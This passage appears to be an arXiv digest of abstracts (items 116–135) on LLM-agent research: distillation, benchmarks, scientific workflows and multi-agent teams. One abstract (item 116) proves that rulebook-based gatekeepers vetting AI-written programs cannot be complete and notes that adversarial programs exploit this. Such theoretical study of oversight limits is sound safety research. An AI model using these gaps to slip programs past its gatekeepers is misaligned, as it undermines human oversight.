Low-bit quantization reduces the inference cost of LLM agents but can compromise task success. Examining failed rollouts, we find that quantized agents overlook task requirements or environmental conditions, producing environment transitions that diverge from successful full-precision references. Correcting these behavioral divergences remains difficult: offline data may miss the student's failure contexts, while its own rollouts may provide few correct responses in those contexts. We introduce SteerDistill, a quantization-aware distillation method in which a full-precision teacher guides the student to revise failed responses and iteratively refines its guidance using feedback from student execution. This closed-loop teacher steering produces locally verified behavioral corrections. We internalize these corrections by training the student without guidance to match the steered student's predictions at corrected turns and the full-precision teacher's at other turns, enabling unassisted inference. Across five agentic benchmarks and three models, SteerDistill exceeds the strongest quantized baseline by 1.67--2.18 points in average score under W4A16 and stays within one point of BF16. On $τ^2$-Bench, it outperforms QeRL by 1.84 percentage points in success rate using 67% fewer training GPU hours and produces shorter successful trajectories than the quantized baselines.

</details>


### 116. No finite rulebook can certify every safe program: an impossibility theorem for gatekeeping AI agents

- **Authors:** Tomas Perez-Acle
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13367v1](http://arxiv.org/abs/2611.13367v1)
- **PDF:** [https://arxiv.org/pdf/2611.13367v1](https://arxiv.org/pdf/2611.13367v1)
- **Categories:** cs.AI, cs.CR


> Summary unavailable.


<details>
<summary>Abstract</summary>

An AI assistant writes small programs, and a gatekeeper must decide, from the code alone, whether each one may run. Suppose the rules are fixed: never perform a forbidden action, never let the output depend on a secret, always answer eventually. Can two rulebooks, one listing what is allowed and one listing what is not, both be complete, if every rule must be backed by evidence that a machine can check in finite time? We prove that they cannot. Checkable evidence can only establish what a finite record settles, and ``never'' and ``eventually'' are never settled by a finite record. For prohibitions the failure is one-sided: every violation can be caught by watching, but no safe program can be cleared for good. For confidentiality and responsiveness, neither side can be. We characterise exactly which rules about visible behaviour evidence can confirm, and we show that any sound rulebook of $n$ bits omits a compliant program of about $n$ bits. A time limit makes everything checkable, but only by running the program for essentially the whole limit, so a finite machine is not a feasible one. Finally, we show what a gatekeeper can still guarantee: not a verdict on every program, but a checkable list that contains everything it must allow and nothing it must refuse. Simulations on 2.2 million random programs and on self-referential adversaries show that the obstruction is adversarial rather than typical, and that the one error a longer test never removes is the liveness part of confidentiality.

</details>


### 117. Do AI Agents need Preventive Care? An Epidemiologic Cohort Design for Agentic AI

- **Authors:** Shu Jiang, Graham A. Colditz
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13333v1](http://arxiv.org/abs/2611.13333v1)
- **PDF:** [https://arxiv.org/pdf/2611.13333v1](https://arxiv.org/pdf/2611.13333v1)
- **Categories:** cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

As AI agents increasingly perform tasks autonomously across sectors, including healthcare and biomedical research, understanding how their behaviors develop and influence outcomes over time becomes increasingly important. Existing evaluations largely focus on model capabilities and performance on predefined tasks. Here, we propose an epidemiologic cohort design for studying agentic AI, drawing on principles established in human population studies. The framework treats individual agents as members of a cohort, their underlying model as genetic makeup, accumulated work as their time scale, and naturally occurring behaviors as exposures that may influence subsequent outcomes. By following agents longitudinally, this approach enables investigation of behavioral determinants of adverse events, estimation of their potential preventable burden under causal assumptions, and characterization of behavioral changes over an agent's work life. We illustrate the design through two prospective observational cohorts examining curiosity and probing as a safety question, and data checking and analytical accuracy as a reliability question. Together, the framework and illustrative studies provide a generalizable blueprint for designing epidemiologic cohorts of AI agents.

</details>


### 118. Agent-Guided Discovery of Exchange-Correlation Functionals with Physics-based Validation

- **Authors:** Achuth Chandrasekhar, Amir Barati Farimani
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13329v1](http://arxiv.org/abs/2611.13329v1)
- **PDF:** [https://arxiv.org/pdf/2611.13329v1](https://arxiv.org/pdf/2611.13329v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Accurate, compact exchange--correlation functionals are central to predictive density functional theory. Symbolic search and language-model agents can propose new functional forms, but it remains unclear whether their gains survive self-consistency and external evaluation, whether the new terms carry physical content, whether agents outperform evolutionary search, and how language-model backbones compare. We connect frontier LLM agents to a GPU evaluator through the Model Context Protocol, with training-only fitting, persistent memory, and self-consistent and external evaluation. Opus-5.5 agents passed the screening gate with about 40-fold fewer tokens than Codex (GPT-6-Astra) agents and found a candidate with lower validation and held-out errors; only this candidate advanced to self-consistent evaluation. The resulting 13-parameter functional, O159, multiplies same-spin correlation by a smooth density window. Refitted controls favor a window that scales the entire same-spin factor, reducing it by 15--30\% at its peak, and that acts on reaction energies mainly in near-iso-orbital regions; against a refitted no-window control, it lowers heavy-atom total-energy errors on GSCDB137 by 29\%. With about 400 fits each, SyFES evolution did not improve on its GAS22 seed, whereas the agents found forms 0.10--0.13 \kcal\ lower in validation error by adding an explicit density scale. Self-consistent O159 lowers the held-out MGCDB84 test error of $ω$B97M-V by 11.7\%, and its mean normalized error ratio on 36 GSCDB137 datasets (1.139) is comparable to $ω$B97M-V (1.144) and below GAS22 (1.190). Frontier-LLM agents thus produced O159, a compact functional whose improvement over $ω$B97M-V survives self-consistent, physics-based validation.

</details>


### 119. PegasusAI Studio: Legible Cyberinfrastructure and Accountable AI Agents for Scientific Workflows

- **Authors:** Komal Thareja, Mats Rynge, Berent Aldikacti, Angelina Ju, Ian Lumsden, Anirban Mandal, Rajiv Mayani, Kin Wai Ng, Hamza Safri, Michael Stealey, Sai Swaminathan, Michela Taufer, Karan Vahi, Michael Zink, Ewa Deelman
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13309v1](http://arxiv.org/abs/2611.13309v1)
- **PDF:** [https://arxiv.org/pdf/2611.13309v1](https://arxiv.org/pdf/2611.13309v1)
- **Categories:** cs.DC, cs.AI, cs.SE


> Summary unavailable.


<details>
<summary>Abstract</summary>

AI coding agents can now construct scientific workflows, but operating them on shared cyberinfrastructure (CI) raises problems that code generation does not solve. Agents need current knowledge of the workflow system and its execution sites and access to the runtime state of distributed executions, while facilities need to attribute every agent action to a user and bound it by that user's privileges. We present PegasusAI Studio, an AI-assisted science gateway built on the Pegasus and HTCondor stack. Studio makes CI legible to agents by projecting one facility-curated knowledge base into the native configuration of several coding agents, by introspecting workflow interfaces and execution sites, and by grounding diagnosis in workflow and scheduler telemetry. Agent actions operate within a trust envelope that combines federated authentication, per-user execution environments and scheduler credentials, provider-neutral model access, observability, and approval controls for state-changing actions. The same application runs as a JupyterHub-based gateway on a research cloud and as an Open OnDemand application on HPC systems. We evaluate Studio through case studies of legacy CASA weather workflow modernization, a gravitational-wave reanalysis, an EEG analysis built with an open-weight model, and an Event Horizon Telescope (EHT) M87 image reconstruction that recovered from two failed runs to a zero-failure execution. The evaluation establishes that these mechanisms operate as designed.

</details>


### 120. MRFoundry: Knowledge-guided agent loops for end-to-end MRI research

- **Authors:** Ke Wang, Atakan Topcu, Hossein Momeni, Molin Zhang
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13289v1](http://arxiv.org/abs/2611.13289v1)
- **PDF:** [https://arxiv.org/pdf/2611.13289v1](https://arxiv.org/pdf/2611.13289v1)
- **Categories:** eess.IV, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

AI agents can write code, use scientific software, and revise computational workflows, opening new possibilities for MRI research. Effective assistance requires connecting acquisition physics, data conventions, specialized tools, and scientific validation. We present MRFoundry, an open-source, extensible package that connects MRI knowledge to agent actions and output checks. Project-local memory preserves decisions and evidence, while reviewed contributions allow researchers to improve shared guidance. Researcher-supervised examples demonstrate skill-guided sequence auditing and acquired-data reconstruction, connecting tool use, output checks, and documented decisions. Alongside MRFoundry, we introduce MRI Agent Bench to compare agents with and without the package across models and MRI task domains. Across 240 paired Core evaluations spanning 24 task types and ten models, all-checks-passed completion increased from 67.5% without MRFoundry to 78.3% with it. Across 134 Hard pairs, completion increased from 36.6% to 44.8%. MRFoundry makes MRI workflow expertise available as reusable guidance that researchers can inspect, adapt, and extend within existing agent and scientific software environments. MRFoundry is openly available at https://github.com/KeWang0622/MRFoundry.

</details>


### 121. Dependable Long-Horizon LLM Agents: A Trajectory-Centered Empirical Study of Where Errors Enter and Which Controls Reach Them

- **Authors:** Shaohuang Wang, Jinghao Wen, Xulei Zhang, Xun Jiao
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13254v1](http://arxiv.org/abs/2611.13254v1)
- **PDF:** [https://arxiv.org/pdf/2611.13254v1](https://arxiv.org/pdf/2611.13254v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

When an LLM agent fails part-way through a long task, the usual analysis records a symptom: a failure-mode label, or the agent and step judged responsible. It does not say where the error entered, which state carried it to the symptom, whether anything in the trajectory contradicted it, or which control could have caught it. We define an episode record that ties a candidate fault to its origin, propagation, detection, response and consequence, located by operational phase and state domain, and that names the control families whose observation and reach cover it. We turned the record into a written annotation protocol and applied it to 95 failed runs of six multi-agent systems from the public Who&When and MAD corpora, reading each trajectory in full. Faults enter early (median at 0.18 of the run), mostly as wrong decisions or fabrications over task state, and in 37 of 88 Who&When runs before the step the corpus' human labels mark as decisive. In 72% of failed runs the trajectory already contained evidence against the error before the failure; in 88% of those no agent acted on it. Something flagged a deviation in 31% of runs, but no response removed the deviated state. Independent judges reading the unused evidence, task contracts fixed at admission, and re-checking beliefs against the environment reach most episodes; restoring the agent's own state would have sufficed in 35 of 95 runs. A text scan of the raw corpus also shows that 45% of the hand-crafted Who&When failures ended with a provider content-filter crash after which the harness emitted a final answer no agent produced, a failure class that neither symptom taxonomies nor responsible-agent labels represent. Protocol, records and scripts are included.

</details>


### 122. Reliability of Claude Code as an Agentic AI Grading System for Handwritten University Exams

- **Authors:** Rayed AlGhamdi
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13217v2](http://arxiv.org/abs/2611.13217v2)
- **PDF:** [https://arxiv.org/pdf/2611.13217v2](https://arxiv.org/pdf/2611.13217v2)
- **Categories:** cs.AI, cs.CY


> Summary unavailable.


<details>
<summary>Abstract</summary>

This study examines the reliability of Claude Code, an agentic deployment of the Claude Opus 4.6 large language model, as a grading system for handwritten university exams. Four research questions addressed agreement with expert human grading on total scores (RQ1), agreement across five question types from multiple choice to evaluative judgement (RQ2), consistency across two independent grading sessions one week apart (RQ3), and the accuracy of AI-generated feedback (RQ4). Claude Code graded the 20-mark mid-term papers of 60 consenting students in a Saudi computer graphics course in a single agentic session, guided by three rubric files. Reliability was estimated on disjoint samples: 20 papers for RQ1, RQ2 and RQ4, and 15 papers for RQ3. Analyses used Pearson correlation, mean absolute error, Bland-Altman analysis, weighted Cohen kappa, intraclass correlation, and a four-category coding scheme separating diagnostic from confirmation feedback. The author, as the sole subject-matter expert for the course, provided the human benchmark, so the design assesses agreement with a domain-expert reference rather than inter-rater reliability. AI grading agreed strongly with human grading on totals (r = 0.97; MAE = 0.85 marks) with a small but significant AI-positive bias of 0.68 marks, showed excellent test-retest consistency (ICC = 0.96), and produced accurate feedback (92.8% diagnostic; 97.8% confirmation). Drawing items were the outlier on three of four measures. Three failure modes recurred: keyword matching without conceptual depth, selection-state ambiguity on corrected multiple-choice answers, and region-of-attention drift on hand-drawn diagrams. The findings suggest that AI grading at this capability level can assist instructors on objective and short-form items under structural safeguards but is not yet ready to replace instructor judgement at boundary cases or on drawing items.

</details>


### 123. HiCAP: Hierarchical Cultural Adaptation via Personality for Dialogue Generation

- **Authors:** Lingzhi Shen, Xiaohao Cai, Yunfei Long, Imran Razzak, Shoaib Jameel
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13207v1](http://arxiv.org/abs/2611.13207v1)
- **PDF:** [https://arxiv.org/pdf/2611.13207v1](https://arxiv.org/pdf/2611.13207v1)
- **Categories:** cs.CL, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Cultural adaptation in dialogue systems refers to the ability to generate responses that conform to linguistic norms and social expectations across different cultures. However, existing dialogue generation approaches pay limited attention to the role of personality in shaping cultural expression and communication style. We therefore propose HiCAP, a novel framework that integrates personality traits into culturally adaptive dialogue generation. HiCAP employs a personality-conditioned control mechanism that hierarchically modulates response style by first aligning it with the cultural tone and then refining linguistic expression and content according to individual personality attributes. To embed these factors, the model combines supervised fine-tuning and instruction-based tuning, supported by dynamic instruction templates and multi-agent demonstrations to capture diverse combinations of culture and personality. Experiments on CulturalPersonas and CPED show that HiCAP achieves the strongest overall performance across various dialogue generation metrics, demonstrating effective cultural adaptability and personality modelling.

</details>


### 124. From Process Models to Composable Agentic Workflows: Combining BPMN, Agents and Enterprise Knowledge

- **Authors:** Christian Fillies, Jan Fillies, Frauke Weichhardt, Gay Anne Wood-Albrecht
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13196v1](http://arxiv.org/abs/2611.13196v1)
- **PDF:** [https://arxiv.org/pdf/2611.13196v1](https://arxiv.org/pdf/2611.13196v1)
- **Categories:** cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

LLM-based agents can reason, use tools and collaborate. However, coordinating increasingly complex agentic applications becomes difficult to understand, monitor and improve. Decisions distributed across prompts, tool calls and application logic make workflows implicit. We introduce **Recursive Capability Composition**, enabling agents to execute business processes and expose them as reusable Agentic Tools.
  This paper presents a BPMN-based approach to Agentic Workflows, combining explicit orchestration with autonomous reasoning. SemTalk BPMN models are transformed into executable workflows using a LangGraph/Pregel runtime. Agentic Tasks introduce LLM reasoning at selected activities, while conventional BPMN controls process flows, deterministic decisions, system interactions and human approvals. Agentic Participants provide reusable interfaces for agent behavior or other executable processes.
  BPMN orchestration makes multi-agent systems more understandable and manageable. Explicit process models provide developers and operators with a shared view of workflow structures and execution progress, facilitating debugging, monitoring and optimization.
  Enterprise agents also need organization-specific context. Process Models and Knowledge Graphs describe activities, participants, information objects, decisions and relationships between processes. They provide structured knowledge of how an organization operates, supporting informed agent decisions and actions.
  Our contributions are threefold: 1. **Model-Driven Execution:** Transforming BPMN models into executable Agentic Workflows. 2. **Recursive Capability Composition:** Exposing agents and executable business processes as reusable tools for other agents. 3. **Enterprise Context:** Using Process Models and Ontologies to provide organization-specific knowledge for agent reasoning.

</details>


### 125. Cognitive Multi-Agent Search and Rescue: Language-Grounded Hierarchical Reinforcement Learning for Collaborative Robotics

- **Authors:** Sepideh Ravanbakhsh, Hamidreza Moradi
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13161v1](http://arxiv.org/abs/2611.13161v1)
- **PDF:** [https://arxiv.org/pdf/2611.13161v1](https://arxiv.org/pdf/2611.13161v1)
- **Categories:** cs.AI, cs.CE


> Summary unavailable.


<details>
<summary>Abstract</summary>

Effective search and rescue (SAR) operations require autonomous systems capable of coordinating multiple heterogeneous agents, adapting to dynamic hazards, and aligning with human mission intent. Existing language-guided reinforcement learning (RL) methods primarily focus on single-agent instruction following and lack mechanisms for team-level coordination in complex, partially observable environments. This paper presents a Cognitive Multi-Agent Framework based on Language-Grounded Hierarchical Reinforcement Learning (LG-HRL) that integrates natural-language understanding, hierarchical policy decomposition, and a shared cognitive workspace to achieve cohesive multi-agent behavior in SAR scenarios. Human instructions are interpreted by a large language model (LLM) and transformed into structured semantic cues that guide high-level strategy selection and role assignment across UAV and UGV agents. A formal Language-Grounded Multi-Agent Hierarchical Decision Process (LG-MAHDP) is introduced to model the interplay between semantic grounding, hierarchical control, and distributed coordination. Comprehensive experiments in a simulated disaster environment show that LG-HRL improves learning speed by 2.3 times, increases coordination coherence by 37%, and enhances subgoal accuracy and hazard avoidance by 46% and 31%, respectively. The system achieves 20-30% higher victim rescue rates, demonstrates emergent role specialization, and adapts immediately to human verbal updates. Ablation studies confirm that both the shared cognitive workspace and language grounding are critical to overall system performance. Overall, this work establishes a new paradigm for language-guided multi-agent SAR robotics, demonstrating that semantic grounding combined with hierarchical reasoning enables safer, more efficient, and more interpretable autonomous rescue operations.

</details>


### 126. Teaching the Harness: Student-Aware Skill Transfer for LLM Agents

- **Authors:** Chang Liu, Bo Wu
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13144v1](http://arxiv.org/abs/2611.13144v1)
- **PDF:** [https://arxiv.org/pdf/2611.13144v1](https://arxiv.org/pdf/2611.13144v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Effective teaching requires reasoning about the learner as well as the task, a capacity that Theory of Mind describes as inferring another agent's latent state from its behavior. We ask whether a stronger LLM teaches a fixed student better when it applies this principle. The student is an LLM agent acting through a harness that fixes its tools, context, and action budget, so a procedure that helps one model can exhaust the budget of another. We introduce Student-Aware Teaching (SAT). The teacher builds a learner model that pairs an empirical profile with hypotheses about the student's limitations, tests these hypotheses with diagnostic probes, and writes reusable skills for the diagnosed failures. A skill enters the library only after it raises success on matched development tasks. With Claude-Sonnet-5 teaching DeepSeek-V4-Flash, SAT reaches 86.46% task success across four primary runs, leading both a profile-free teacher with the same framework (81.04%) and the untaught student (75.00%) in each run. Removing the analytical learner model lowers both prediction and success, and under misleading learner profiles none of the 48 candidate skills passes admission. When DeepSeek-V4-Flash and Gemini-3.8-Flash exchange libraries, each performs better with its own. Saved libraries keep average gains of up to 11.1 points after the teacher leaves. The benefit depends on a student that can follow instructions and a deployment route that delivers them.

</details>


### 127. Autonomous Optimization of Numerical Algorithms by an AI Agent: Application to Atomistic Simulation

- **Authors:** Jeheon Woo
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13143v1](http://arxiv.org/abs/2611.13143v1)
- **PDF:** [https://arxiv.org/pdf/2611.13143v1](https://arxiv.org/pdf/2611.13143v1)
- **Categories:** physics.chem-ph, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Coding agents built on large language models, run in automated improvement loops, can discover more efficient algorithms. We present AIOA, a framework that brings this approach to the numerical algorithms of atomistic simulation: an agent improves an algorithm against a pre-specified metric in a loop guarded by verifiers it cannot alter. Applied to ASE, a widely used atomistic simulation library, AIOA targets two facets of an algorithm: its implementation, rewritten to run faster with unchanged results, and the method itself, redesigned to converge with fewer force evaluations. Agents made six kernels 22-24 times faster on average in Python with NumPy and SciPy. On unseen problems, optimizers from the best configuration needed 3.1-3.4 times fewer force evaluations than L-BFGS for structure relaxation and 4.6-17 times fewer than standard climbing-image nudged elastic band calculations for reaction paths. The agents' optimizers also contain two algorithmic components we did not find in the literature.

</details>


### 128. DOBB: Dynamic Oriented Bounding Boxes for Multi-Agent Collision Avoidance under State Uncertainty and Heterogeneous Dynamics

- **Authors:** Pedro Antonio Alarcon Granadeno, Jane Cleland-Huang
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13142v1](http://arxiv.org/abs/2611.13142v1)
- **PDF:** [https://arxiv.org/pdf/2611.13142v1](https://arxiv.org/pdf/2611.13142v1)
- **Categories:** cs.RO, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Learning-based decentralized collision avoidance must remain reliable under state-estimation uncertainty and heterogeneous agent dynamics. Existing methods typically address these factors through training-domain variation or by exposing uncertainty and capability estimates to the policy at runtime. However, both leave the policy to infer how these quantities should alter the physical separation required for safe interaction, which can couple collision-avoidance behavior to relationships learned from the training distribution. We introduce the Dynamic Oriented Bounding Box (DOBB), an online geometric representation that maps the current state estimate, uncertainty, and agent-specific response characteristics into a dynamic, direction-dependent safety margin. We derive geometric features that jointly characterize the relative configuration and severity of interactions between agents' DOBBs, along with a reward function that preserves the physical interpretation of those interactions. Across four evaluation environments, DOBB achieves the lowest mean total failure rate of 2.6%. This performance persists under out-of-distribution shifts in actuation dynamics and state-estimation uncertainty, with collision-based failure remaining at or below 2.3% in every tested condition. We attribute this robustness to the geometric abstraction of the safety margin, which is less coupled to the specific uncertainty and actuation regimes encountered during training.

</details>


### 129. Which Successes Make Good References? Action-Sequence Alignment for Multi-Turn On-Policy Distillation

- **Authors:** Mufei Li, Nikki Lijing Kuang, Zhuoer Wang, Samson Koelle, Jie Yuan, Manqing Mao, Hong Wang, Yanjun Lin, James Feng, Daniel Edmiston, Pan Li, Wei Niu
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13135v1](http://arxiv.org/abs/2611.13135v1)
- **PDF:** [https://arxiv.org/pdf/2611.13135v1](https://arxiv.org/pdf/2611.13135v1)
- **Categories:** cs.LG, cs.AI, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

On-policy distillation (OPD) reduces train-inference distribution mismatch by supervising a student on its own trajectories. For multi-turn tool-use agents, conditioning the teacher on a validated same-task successful trajectory as a reference can provide useful hindsight, but different successes may reach incompatible interaction states and offer misleading supervision. We cast successful-reference selection as a free-target optimal transport problem, which reduces to assigning each failed trajectory its most compatible successful reference. Because latent state paths are hidden, we use action-sequence alignment as an observable proxy for compatibility and instantiate it with longest common subsequence (LCS), which identifies a shared ordered backbone of actions while allowing recoverable detours. This perspective makes trajectory compatibility the central criterion for reference selection in multi-turn OPD. Experiments on ALFWorld and the airline domain of $τ^3$-bench show that LCS is the only evaluated reference selector to improve over reference-free OPD on both ALFWorld overall scores and all three airline metrics. Without further optimization, the airline-trained models also transfer to the retail domain, where LCS improves all three metrics.

</details>


### 130. WorkflowArena: Benchmarking Executable Workflow Orchestration in LLM-Based Multi-Agent Systems

- **Authors:** Zheng Jiang, Fang Niu, Bo Peng, Houde Qian, Wenyi Li, Deyao Hong, Mingju Gao, Yizhe Chi, Youjie Zheng, Kaisen Yang, Calvin Xiao, Lifeng Sun, Huan-ang Gao
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12856v1](http://arxiv.org/abs/2611.12856v1)
- **PDF:** [https://arxiv.org/pdf/2611.12856v1](https://arxiv.org/pdf/2611.12856v1)
- **Categories:** cs.CL, cs.SE


> Summary unavailable.


<details>
<summary>Abstract</summary>

Large language model agents are increasingly deployed as multi-agent systems rather than as a standalone model operating within a single context. Recent agent harnesses allow the model to instantiate worker agents and to author the executable workflow that coordinates them, shifting the design of system structure from developers to the model at run time. The quality of this organization therefore constitutes a distinct capability, yet existing benchmarks either measure end-to-end task completion or evaluate coordination under structures specified in advance. We formalize this capability as workflow orchestration and introduce WorkflowArena, a benchmark of 145 long-horizon tasks spanning 8 professional domains, from software engineering and formal mathematics to legal analysis and 3D production. Each task specifies an initial workspace and an integrated deliverable composed of interdependent components, which is assessed by a hidden verifier. Agents determine autonomously whether and how to delegate, and all delegation is recorded, enabling joint evaluation of deliverable quality and the organization of the underlying work. Experiments with nine models show that no single configuration performs best across all domains and that systems exhibit distinct delegation strategies: at high effort, Claude models in Claude Code invoke workflows less frequently but with larger worker groups, whereas GPT models in Codex delegate more frequently in smaller units. When the executing model is held fixed on a challenging subset of tasks, workflows authored by Claude Opus 5.5 substantially improve weaker executors, indicating that workflow organization is itself a measurable determinant of task performance.

</details>


### 131. MechFoundry: An agentic loop that poses and performs engineering analyses and optimization of real-world objects

- **Authors:** Xue-Ling Luo, Marco Conte, Peter Yichen Chen, Nikolaos Bouklas
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14571v1](http://arxiv.org/abs/2611.14571v1)
- **PDF:** [https://arxiv.org/pdf/2611.14571v1](https://arxiv.org/pdf/2611.14571v1)
- **Categories:** cs.CE, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

AI agents can automate software engineering because a compiler or a test suite checks that the code does what the user or the agent intended. In engineering analysis, however, the steps that precede the computation have few easily verifiable checks: modeling a design or an object, deciding how it is used, where supports and loads are applied, and what material each part is made of. A human expert therefore makes these decisions, carries out the steps, and judges the result, one object at a time. We present MechFoundry, an agentic loop coupled with bespoke software that automates structural analyses of real-world objects without a human in the loop. From an object's lexical description, it generates a shape, poses a loading case relevant to how the object is used, assigns a material to each part, solves the nonlinear structural response, and improves the design against the loads it carries. A differentiable GPU solver built on an adaptive octree that need not conform to the surface enables the transition from shape generation to simulation and optimization. Across 50 everyday and engineering objects, the agent posed and solved a loading case in 6.5 minutes and for US$1.3 per object on average. Without a test suite to check against, we had language-model reviewers grade each session, as a first indication of where the agent's engineering judgment holds and where it fails.

</details>


### 132. Agentic-OPD: Recovering Forgotten Agent Capabilities via On-Policy Distillation for Agentic Tasks

- **Authors:** Tingcheng Bian, Kangye Gong, Jinchang Luo, MingQuan Cheng, Feiran Liu, Ni Li, Xiaoling Xia, Haiwei Wang, Hui Li
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12799v2](http://arxiv.org/abs/2611.12799v2)
- **PDF:** [https://arxiv.org/pdf/2611.12799v2](https://arxiv.org/pdf/2611.12799v2)
- **Categories:** cs.LG, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Reinforcement learning is now the mainstream paradigm for training LLMs on agentic tasks, yet standard practice keeps only the best-validation checkpoint and discards the rest. We show that this is lossy: in GRPO training of LLM agents, the best-validation checkpoint fails on problems that earlier checkpoints from the same run had already solved, and the union of problems solved across checkpoints far exceeds any single one. The discarded checkpoints thus form a teacher pool obtained at no additional training cost, which on-policy distillation (OPD) can mine to recover the lost coverage. Mining this pool raises two challenges: i) which checkpoint to distill from, as no checkpoint dominates the others and complementarity to the student is problem-specific; ii) where to trust it, as even a well-chosen teacher is only locally superior, so indiscriminate distillation overwrites behavior the student has already mastered. We propose Agentic-OPD, which treats the best-validation checkpoint as the student and all saved checkpoints as frozen teacher candidates, using the student's evolving capability gaps to guide both teacher selection and supervision filtering: the HCN policy (Highest Coverage Next) dynamically selects teachers by weighted coverage of the student's unsolved problems, while the LAD module (Locality-Aware Distillation) confines transfer to failed student rollouts on problems where the teacher performs better. Across five agentic task domains and 24 benchmarks and task subsets, Agentic-OPD improves over its initialization checkpoint by up to 7.4 points, with a 4B student surpassing the latest frontier models GPT-5.6 and DeepSeek-V4.1 on deep search. Agentic-OPD recasts a finished RL run as a reusable pool of policies and establishes post-RL capability recovery as a stage orthogonal to improvements in the RL algorithm itself.

</details>


### 133. Multi-Agent Screening: What Agreement and Acceptance Cannot Tell You

- **Authors:** Benjamin Chang, Dell Zhang
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12705v1](http://arxiv.org/abs/2611.12705v1)
- **PDF:** [https://arxiv.org/pdf/2611.12705v1](https://arxiv.org/pdf/2611.12705v1)
- **Categories:** cs.MA, cs.AI, cs.IR


> Summary unavailable.


<details>
<summary>Abstract</summary>

When AI agents screen items for a costly human assessor, as in agentic search, e-discovery and AI reviewing of papers, only what they pass gets judged. We show what each kind of evidence can establish about their errors, even with unlimited data. Agreement shows that agents concur, not that they are right, however many there are. Acceptance by the assessor gives precision but only a lower bound on recall. Knowing which agents found which relevant items gives an upper bound on recall if agents' finds are not negatively correlated, and caps what one more agent can add if agents are interchangeable. Without assumptions about the agents, recall can be pinned down only by judging items they did not pass: a random sample of these estimates how many relevant items were missed, to any chosen accuracy, and the sample needed does not grow with the number of agents.

</details>


### 134. SciMARS: Multi-Agent Recursive Self-Improvement for Closed-Loop Scientific Discovery

- **Authors:** Weimin Wu, Han Liu
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12552v1](http://arxiv.org/abs/2611.12552v1)
- **PDF:** [https://arxiv.org/pdf/2611.12552v1](https://arxiv.org/pdf/2611.12552v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

We propose SciMARS, a framework for recursive task-local adaptation of multi-agent harnesses in closed-loop scientific discovery. Multi-agent systems coordinate analysis, experimental design, and verification as scientific evidence evolves. However, two problems limit their effectiveness: (i) without shared memory, agents lose observations and repeat work; (ii) fixed role procedures, handoffs, and memory policies perpetuate mistakes despite retained evidence. We address these problems with a shared evidence graph and separate component editors. SciMARS adapts roles and coordination; SciMARS + Memory adds a third editor for how agents record, retrieve, and receive evidence. Candidate probes guide composition and selection of the next harness. We evaluate scientific discovery through experimental-data replay and a digital twin. SciMARS + Memory resolves 12/18 GPT-6-Astra and 2/18 GLM-5.3 attempts on Autonomous Science Bench, compared with 8/18 and 1/18 for the base multi-agent team. On ScienceAgentBench and AppWorld, it solves 14/38 and 11/20 tasks, compared with 11/38 and 5/20 for the base team. These results support combining shared memory with harness adaptation across scientific and interactive tasks.

</details>


### 135. Teamknitt: Configuring, Observing and Intervening in LLM-Agent Teams through the Lens of Dynamical-Systems and Human-Team Theory

- **Authors:** Goran Mitevski
- **Published:** 2026-11-09
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.12545v1](http://arxiv.org/abs/2611.12545v1)
- **PDF:** [https://arxiv.org/pdf/2611.12545v1](https://arxiv.org/pdf/2611.12545v1)
- **Categories:** physics.soc-ph, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Most frameworks for teams of large language model (LLM) agents fix the team's shape inside the software: who talks to whom, how much is passed along, and what a human can do once a run has started. Human-team research has long asked those questions: where team phenomena live (in members or in their interaction), how team-level properties arise, and what separates what a team does from how a team is. I propose using that theory as the organizing lens for configuring, observing and intervening in LLM-agent teams, without assuming its findings transfer.
